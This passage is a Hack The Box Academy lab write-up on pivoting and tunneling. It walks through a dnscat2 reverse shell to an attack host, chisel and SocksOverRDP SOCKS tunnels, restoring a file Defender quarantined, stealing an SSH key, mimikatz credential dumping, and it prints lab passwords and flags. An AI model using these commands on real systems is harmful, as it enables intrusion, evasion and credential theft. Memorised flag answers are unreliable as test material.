remote: Total 191 (delta 0), reused 2 (delta 0), pack-reused 188
Receiving objects: 100% (191/191), 1.26 MiB | 6.50 MiB/s, done.
Resolving deltas: 100% (59/59), done.
```

Copy it to the Windows target.

![](./attachments/Pasted%20image%2020230222112840.png)

Run `powershell` and import `dnscat2.ps1`.

```
PS C:\Users\htb-student\Desktop> Import-Module .\dnscat2.ps1
```

Now we can call home bt inserting the attack host IP address and the secret generated by the server.

```
PS C:\Users\htb-student\Desktop> Start-Dnscat2 -DNSserver 10.10.15.176 -Domain inlanefreight.local -PreSharedSecret d866ecfb9007f418429a6d9499864114 -Exec cmd
```

Back on the attack host we recieve the connection.

```
dnscat2> New window created: 1
Session 1 Security: ENCRYPTED AND VERIFIED!
(the security depends on the strength of your pre-shared secret!)

dnscat2>
```

With command `window -i 1` we can spawn a Windows CMD shell and execute commands.

```
dnscat2> window -i 1
New window created: 1
history_size (session) => 1000
Session 1 Security: ENCRYPTED AND VERIFIED!
(the security depends on the strength of your pre-shared secret!)
This is a console session!

That means that anything you type will be sent as-is to the
client, and anything they type will be displayed as-is on the
screen! If the client is executing a command and you don't
see a prompt, try typing 'pwd' or something!

To go back, type ctrl-z.

Microsoft Windows [Version 10.0.18363.1801]
(c) 2019 Microsoft Corporation. All rights reserved.

C:\Windows\system32>
exec (OFFICEMANAGER) 1> type C:\Users\htb-student\Documents\flag.txt
exec (OFFICEMANAGER) 1> type C:\Users\htb-student\Documents\flag.txt
AC@tinth3Tunnel
```

**Answer:** `AC@tinth3Tunnel`

---
## SOCKS5 Tunneling with Chisel
### Question:
![](./attachments/Pasted%20image%2020230222203347.png)

```
┌──(kali㉿kali)-[~/HTB/PivotingTunnelingAndPortForwarding]
└─$ git clone https://github.com/jpillora/chisel.git
Cloning into 'chisel'...
remote: Enumerating objects: 2167, done.
remote: Counting objects: 100% (5/5), done.
remote: Compressing objects: 100% (4/4), done.
remote: Total 2167 (delta 0), reused 2 (delta 0), pack-reused 2162
Receiving objects: 100% (2167/2167), 3.46 MiB | 1.24 MiB/s, done.
Resolving deltas: 100% (1025/1025), done.

┌──(kali㉿kali)-[~/HTB/PivotingTunnelingAndPortForwarding]
└─$ cd chisel
```

We need to disable `Cgo` to get rid of dependencies that will make the binary unable to execute on the target.

```
┌──(kali㉿kali)-[~/HTB/PivotingTunnelingAndPortForwarding/chisel]
└─$ export CGO_ENABLED=0
```

Then compile the binary.

```
┌──(kali㉿kali)-[~/HTB/PivotingTunnelingAndPortForwarding/chisel]
└─$ go build

┌──(kali㉿kali)-[~/HTB/PivotingTunnelingAndPortForwarding/chisel]
└─$ du -hs chisel    
12M     chisel
```

We can make the binary smaller by stripping it of debuging and dwarf information.

```
┌──(kali㉿kali)-[~/HTB/PivotingTunnelingAndPortForwarding/chisel]
└─$ go build -ldflags="-s -w"

┌──(kali㉿kali)-[~/HTB/PivotingTunnelingAndPortForwarding/chisel]
└─$ du -hs chisel            
8.1M    chisel
```

And even smallet with `upx`.

```
┌──(kali㉿kali)-[~/HTB/PivotingTunnelingAndPortForwarding/chisel]
└─$ upx brute chisel                               
                       Ultimate Packer for eXecutables
                          Copyright (C) 1996 - 2020
UPX 3.96        Markus Oberhumer, Laszlo Molnar & John Reiser   Jan 23rd 2020

        File size         Ratio      Format      Name
   --------------------   ------   -----------   -----------
upx: brute: FileNotFoundException: brute: No such file or directory
   8433664 ->   3367636   39.93%   linux/amd64   chisel                        

Packed 1 file.

┌──(kali㉿kali)-[~/HTB/PivotingTunnelingAndPortForwarding/chisel]
└─$ du -hs chisel   
3.3M    chisel
```

We are down to 3.3M from 12M.

Now we need to move the binary to the pivot host.

```
┌──(kali㉿kali)-[~/HTB/PivotingTunnelingAndPortForwarding/chisel]
└─$ scp -r chisel ubuntu@10.129.171.104:~/
ubuntu@10.129.171.104's password: 
chisel                                                                            100% 3277KB   5.3MB/s   00:00 
```

`SSH` into the box and execute the server version of `chisel`.

```
┌──(kali㉿kali)-[~/HTB/PivotingTunnelingAndPortForwarding/chisel]
└─$ ssh ubuntu@10.129.171.104             
ubuntu@10.129.171.104's password: 
Welcome to Ubuntu 20.04.3 LTS (GNU/Linux 5.4.0-91-generic x86_64)

Last login: Wed Feb 22 19:22:26 2023 from 10.10.15.178
ubuntu@WEB01:~$ ls
chisel
ubuntu@WEB01:~$ ./chisel server -v -p 1234 --socks5
2023/02/22 19:24:16 server: Fingerprint JEIGvGMk1P3UxzJb1OUAK+oPLuMm9rZ+2cq1zKVwBFo=
2023/02/22 19:24:16 server: Listening on http://0.0.0.0:1234
```

Execute the client version of chisel on the attack host.

```
┌──(kali㉿kali)-[~/HTB/PivotingTunnelingAndPortForwarding/chisel]
└─$ ./chisel client -v 10.129.171.104:1234 socks
2023/02/22 14:27:08 client: tun: Bound proxies
2023/02/22 14:27:09 client: Handshaking...
2023/02/22 14:27:09 client: Sending config
2023/02/22 14:27:09 client: tun: SSH connected
```

`Chisel` proxies via `SOCKS5` and port `1080` so we need to edit the `/etc/proxychains.conf` file.

```
┌──(kali㉿kali)-[~]
└─$ tail -f /etc/proxychains.conf
#       proxy types: http, socks4, socks5
#        ( auth types supported: "basic"-http  "user/pass"-socks )
#
[ProxyList]
# add proxy here ...
# meanwile
# defaults set to "tor"
#socks4         127.0.0.1 9050
socks5 127.0.0.1 1080
```

Finaly we can use `xfreerdp` to `RDP` into the target.

```
┌──(kali㉿kali)-[~]
└─$ proxychains xfreerdp /v:172.16.5.19 /u:victor /p:pass@123
```

![](./attachments/Pasted%20image%2020230222204656.png)

**Answer:** `Th3$eTunne1$@rent8oring!`

---
## ICMP Tunneling with SOCKS
### Question:
![](./attachments/Pasted%20image%2020230222211027.png)

VM is outdated, and displays this error when running `ptunnel-ng`.

```
ubuntu@WEB01:~/ptunnel-ng/src$ sudo ./ptunnel-ng -r10.129.47.136 -R22
[sudo] password for ubuntu: 
./ptunnel-ng: /lib/x86_64-linux-gnu/libc.so.6: version `GLIBC_2.36' not found (required by ./ptunnel-ng)
./ptunnel-ng: /lib/x86_64-linux-gnu/libc.so.6: version `GLIBC_2.34' not found (required by ./ptunnel-ng)
```

Found the flag using the metod used in the previos section.

**Answer:** `N3Tw0rkTunnelV1sion!`

---
## RDP and SOCKS Tunneling with SocksOverRDP
### Question:
![](./attachments/Pasted%20image%2020230223102410.png)
*Hint: Jason is a local account and a Defender may try to stand in your way.*

`RDP` into the `htb-student` machine.

```
┌──(kali㉿kali)-[~]
└─$ xfreerdp /u:htb-student /p:'HTB_@cademy_stdnt!' /v:10.129.42.198
```

Download [SocksOverRDP](https://github.com/nccgroup/SocksOverRDP/releases) and copy it to the machine and extract it. 

Windows defender will detect the `.dll` file and quarantine it. We need to restore it.

Open `Virus and Threat protection` then to go `Threat history` and restore the quarantined file.

![](./attachments/Pasted%20image%2020230223110547.png)

```
C:\Users\htb-student\Desktop\SocksOverRDP-x64>dir
 Volume in drive C has no label.
 Volume Serial Number is C41A-F2ED

 Directory of C:\Users\htb-student\Desktop\SocksOverRDP-x64

02/23/2023  01:31 AM    <DIR>          .
02/23/2023  01:31 AM    <DIR>          ..
02/23/2023  01:28 AM            67,584 SocksOverRDP-Plugin.dll
05/14/2020  09:56 PM            31,232 SocksOverRDP-Server.exe
               2 File(s)         98,816 bytes
               2 Dir(s)  12,628,742,144 bytes free

C:\Users\htb-student\Desktop\SocksOverRDP-x64>regsvr32.exe SocksOverRDP-Plugin.dll
```

A pop-up will confirm the action.

![](./attachments/Pasted%20image%2020230223110735.png)

Now we can connect to the next target at `179.16.5.19` using `mstsc.exe`.

![](./attachments/Pasted%20image%2020230223111058.png)

A new `RDP` session will start.

![](./attachments/Pasted%20image%2020230223111020.png)

Now we can confirm that the `SOCKS` listener is started on the first pivot host (`htb-student`)

```
C:\Users\htb-student\Desktop\SocksOverRDP-x64>netstat -antb | findstr 1080
  TCP    127.0.0.1:1080         0.0.0.0:0              LISTENING
```

To pivot even further we need a tool called `ProxifierPE`.

We will [download](https://www.proxifier.com/download/#win-tab) it on our attackhost and copy it all the way to the second pivot host (`179.16.5.19`). Then run it and add a new proxy server with address `172.0.0.1`, port `1080` using `SOCKS5`.

![](./attachments/Pasted%20image%2020230223111438.png)

With `ProxifierPE` running we can start a new `RDP` session with `mstsc.exe` and all the traffic will be proxied via `127.0.0.1:1080`

We can now login as `jason` and get the flag.

![](./attachments/Pasted%20image%2020230223105713.png)

**Answer:** `H0pping@roundwithRDP!`

---
## Skills Assessment
### Question 1:
![](./attachments/Pasted%20image%2020230223113059.png)

```
p0wny@shell:…/www/html# ls /home
administrator
webadmin

p0wny@shell:…/www/html# cd /home/webadmin

p0wny@shell:/home/webadmin# ls -lah
total 40K
drwxr-xr-x 4 webadmin webadmin 4.0K May 18  2022 .
drwxr-xr-x 4 root     root     4.0K May  6  2022 ..
-rw------- 1 webadmin webadmin 1.3K May 23  2022 .bash_history
-rw-r--r-- 1 webadmin webadmin  220 May  6  2022 .bash_logout
-rw-r--r-- 1 webadmin webadmin 3.7K May  6  2022 .bashrc
drwx------ 2 webadmin webadmin 4.0K May 16  2022 .cache
-rw-r--r-- 1 webadmin webadmin  807 May  6  2022 .profile
drwx--x--x 2 webadmin webadmin 4.0K May 16  2022 .ssh
-rw-r--r-- 1 root     root      163 May 16  2022 for-admin-eyes-only
-rw-r--r-- 1 root     root     2.6K May 16  2022 id_rsa

p0wny@shell:/home/webadmin# cat for-admin-eyes-only
# note to self,
in order to reach server01 or other servers in the subnet from here you have to us the user account:mlefay
with a password of :
Plain Human work!
```

**Answer:** `webadmin`

### Question 2:
![](./attachments/Pasted%20image%2020230223113108.png)

Answered in previous question.

**Answer:** `mlefay:Plain Human work!`

### Question 3:
![](./attachments/Pasted%20image%2020230223113115.png)

Login with `SSH` by stealing the SSH private key in the `webadmin` directory.

```
┌──(kali㉿kali)-[~/HTB/PivotingTunnelingAndPortForwarding]
└─$ sudo ssh webadmin@10.129.239.115 -i id_rsa

webadmin@inlanefreight:~$ for i in {1..254} ;do (ping -c 1 172.16.5.$i | grep "bytes from" &) ;done
64 bytes from 172.16.5.15: icmp_seq=1 ttl=64 time=0.014 ms
64 bytes from 172.16.5.35: icmp_seq=1 ttl=128 time=0.578 ms
```

**Answer:** `172.16.5.35`

### Question 4:
![](./attachments/Pasted%20image%2020230223113126.png)
*Hint: Metasploit could really help make this pivot easier to manage.*

To make the pivot work we need to enable `SSH` dynamic port forwarding.

```
┌──(kali㉿kali)-[~/HTB/PivotingTunnelingAndPortForwarding]
└─$ sudo ssh -D 9050 webadmin@10.129.239.115 -i id_rs
```

Confirm `proxychains.conf`.

```
┌──(kali㉿kali)-[~/HTB/PivotingTunnelingAndPortForwarding]
└─$ tail -4 /etc/proxychains.conf
# defaults set to "tor"
socks4 127.0.0.1 9050
#socks5 127.0.0.1 1080
```

Nmap target.

```
┌──(kali㉿kali)-[~/HTB/PivotingTunnelingAndPortForwarding]
└─$ proxychains -q nmap -n -Pn -sV -sC 172.16.5.35
Starting Nmap 7.93 ( https://nmap.org ) at 2023-02-23 06:23 EST
Nmap scan report for 172.16.5.35
Host is up (0.039s latency).
Not shown: 995 closed tcp ports (conn-refused)
PORT     STATE SERVICE       VERSION
22/tcp   open  ssh           OpenSSH for_Windows_8.9 (protocol 2.0)
| ssh-hostkey: 
|   256 0e29c7ed0b4c8087a7893fb04559d917 (ECDSA)
|_  256 f3e70b01faac9c5bfa9c0e79106c9d1f (ED25519)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds?
3389/tcp open  ms-wbt-server Microsoft Terminal Services
|_ssl-date: 2023-02-23T11:24:53+00:00; +4s from scanner time.
| ssl-cert: Subject: commonName=PIVOT-SRV01.INLANEFREIGHT.LOCAL
| Not valid before: 2023-02-22T10:37:42
|_Not valid after:  2023-08-24T10:37:42
| rdp-ntlm-info: 
|   Target_Name: INLANEFREIGHT
|   NetBIOS_Domain_Name: INLANEFREIGHT
|   NetBIOS_Computer_Name: PIVOT-SRV01
|   DNS_Domain_Name: INLANEFREIGHT.LOCAL
|   DNS_Computer_Name: PIVOT-SRV01.INLANEFREIGHT.LOCAL
|   DNS_Tree_Name: INLANEFREIGHT.LOCAL
|   Product_Version: 10.0.17763
|_  System_Time: 2023-02-23T11:24:43+00:00
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   311: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2023-02-23T11:24:44
|_  start_date: N/A
|_clock-skew: mean: 3s, deviation: 0s, median: 3s

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 62.92 seconds
```

`RDP` is enabled on the target.

```
┌──(kali㉿kali)-[~/HTB/PivotingTunnelingAndPortForwarding]
└─$ proxychains -q xfreerdp /v:172.16.5.35 /u:mlefay /p:'Plain Human work!'
```

![](./attachments/Pasted%20image%2020230223123129.png)

**Answer:** `S1ngl3-Piv07-3@sy-Day`

### Question 5:
![](./attachments/Pasted%20image%2020230223113133.png)
*Hint: We may be able to find something stored in LSASS.*

Running `mimikatz` to find credentials.

![](./attachments/Pasted%20image%2020230223192027.png)

![](./attachments/Pasted%20image%2020230223192129.png)

**Answer:** `vfrank`
 
### Question 6:
![](./attachments/Pasted%20image%2020230223113142.png)

Run a ping sweep twice, first to build `ARP` cache, second time we should get an answer.

![](./attachments/Pasted%20image%2020230223194035.png)

![](./attachments/Pasted%20image%2020230223194102.png)

`172.16.6.25` is up.

`RDP` into it.

![](./attachments/Pasted%20image%2020230223194233.png)

**Answer:** `N3tw0rk-H0pp1ng-f0R-FuN`

### Question 7:
![](./attachments/Pasted%20image%2020230223113151.png)

There is a network drive connected to the host.

![](./attachments/Pasted%20image%2020230223194439.png)

Let's check it out.

![](./attachments/Pasted%20image%2020230223194351.png)

**Answer:** `3nd-0xf-Th3-R@inbow!`

---
**Tags:** [[Hack The Box Academy]]